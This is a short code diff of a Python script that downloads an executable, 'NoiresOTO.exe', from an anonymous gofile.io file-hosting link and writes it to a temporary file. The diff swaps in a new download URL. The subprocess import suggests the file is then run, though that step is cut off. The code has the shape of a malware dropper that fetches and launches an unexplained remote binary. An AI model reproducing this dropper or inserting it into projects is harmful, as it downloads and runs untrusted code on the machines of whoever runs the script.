@@ -1,7 +1,7 @@
 import requests
 import tempfile
 import subprocess
-url = "https://store10.gofile.io/download/8e35ed7d-0256-4ab7-9df9-5b13e52bf08d/NoiresOTO.exe"
+url = "https://store1.gofile.io/download/acfee162-d4a2-41db-a8b2-c00ce4bcbc20/NoiresOTO.exe"
 response = requests.get(url)
 temp_file = tempfile.NamedTemporaryFile(delete=False)
 with open(temp_file.name, "wb") as file:
